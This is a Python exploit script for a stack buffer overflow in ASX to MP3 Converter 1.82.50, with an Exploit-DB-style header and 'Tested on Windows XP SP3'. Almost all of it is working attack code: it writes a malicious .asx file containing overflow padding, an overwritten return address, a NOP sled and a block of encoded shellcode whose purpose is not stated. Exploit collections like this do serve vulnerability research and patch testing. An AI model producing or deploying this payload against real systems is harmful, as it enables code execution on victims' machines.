'''
# Exploit Title: ASX to MP3 Converter 1.82.50 Stack Overflow
# Date: 2 Oct 2015
# Exploit Author: ex_ptr
# Vendor Homepage: http://mini-stream.net
# Version: 1.82.50
# Tested on: Windows XP SP3
'''

import struct
filename = "../fixing_exploits/exploit.asx"

dummy = b"A"* 241
EIP   = struct.pack('<I', 0x1003789d)
FFFF  = b"\xFF\xFF\xFF\xFF"
NOP   = b"\x90"*40
payload =  b""
payload += b"\xb8\xb5\xa4\xc8\xa1\xdd\xc3\xd9\x74\x24\xf4"
payload += b"\x5d\x31\xc9\xb1\x52\x31\x45\x12\x03\x45\x12"
payload += b"\x83\x58\x58\x2a\x54\x5e\x49\x29\x97\x9e\x8a"
payload += b"\x4e\x11\x7b\xbb\x4e\x45\x08\xec\x7e\x0d\x5c"
payload += b"\x01\xf4\x43\x74\x92\x78\x4c\x7b\x13\x36\xaa"
payload += b"\xb2\xa4\x6b\x8e\xd5\x26\x76\xc3\x35\x16\xb9"
payload += b"\x16\x34\x5f\xa4\xdb\x64\x08\xa2\x4e\x98\x3d"
payload += b"\xfe\x52\x13\x0d\xee\xd2\xc0\xc6\x11\xf2\x57"
payload += b"\x5c\x48\xd4\x56\xb1\xe0\x5d\x40\xd6\xcd\x14"
payload += b"\xfb\x2c\xb9\xa6\x2d\x7d\x42\x04\x10\xb1\xb1"
payload += b"\x54\x55\x76\x2a\x23\xaf\x84\xd7\x34\x74\xf6"
payload += b"\x03\xb0\x6e\x50\xc7\x62\x4a\x60\x04\xf4\x19"
payload += b"\x6e\xe1\x72\x45\x73\xf4\x57\xfe\x8f\x7d\x56"
payload += b"\xd0\x19\xc5\x7d\xf4\x42\x9d\x1c\xad\x2e\x70"
payload += b"\x20\xad\x90\x2d\x84\xa6\x3d\x39\xb5\xe5\x29"
payload += b"\x8e\xf4\x15\xaa\x98\x8f\x66\x98\x07\x24\xe0"
payload += b"\x90\xc0\xe2\xf7\xd7\xfa\x53\x67\x26\x05\xa4"
payload += b"\xae\xed\x51\xf4\xd8\xc4\xd9\x9f\x18\xe8\x0f"
payload += b"\x0f\x48\x46\xe0\xf0\x38\x26\x50\x99\x52\xa9"
payload += b"\x8f\xb9\x5d\x63\xb8\x50\xa4\xe4\x07\x0c\x8b"
payload += b"\x0e\xef\x4f\xd3\xeb\xc9\xc6\x35\x99\x39\x8f"
payload += b"\xee\x36\xa3\x8a\x64\xa6\x2c\x01\x01\xe8\xa7"
payload += b"\xa6\xf6\xa7\x4f\xc2\xe4\x50\xa0\x99\x56\xf6"
payload += b"\xbf\x37\xfe\x94\x52\xdc\xfe\xd3\x4e\x4b\xa9"
payload += b"\xb4\xa1\x82\x3f\x29\x9b\x3c\x5d\xb0\x7d\x06"
payload += b"\xe5\x6f\xbe\x89\xe4\xe2\xfa\xad\xf6\x3a\x02"
payload += b"\xea\xa2\x92\x55\xa4\x1c\x55\x0c\x06\xf6\x0f"
payload += b"\xe3\xc0\x9e\xd6\xcf\xd2\xd8\xd6\x05\xa5\x04"
payload += b"\x66\xf0\xf0\x3b\x47\x94\xf4\x44\xb5\x04\xfa"
payload += b"\x9f\x7d\x34\xb1\xbd\xd4\xdd\x1c\x54\x65\x80"
payload += b"\x9e\x83\xaa\xbd\x1c\x21\x53\x3a\x3c\x40\x56"
payload += b"\x06\xfa\xb9\x2a\x17\x6f\xbd\x99\x18\xba"

exploit = dummy + FFFF + EIP + NOP + payload

f = open(filename,'wb')
f.write(exploit)
f.close()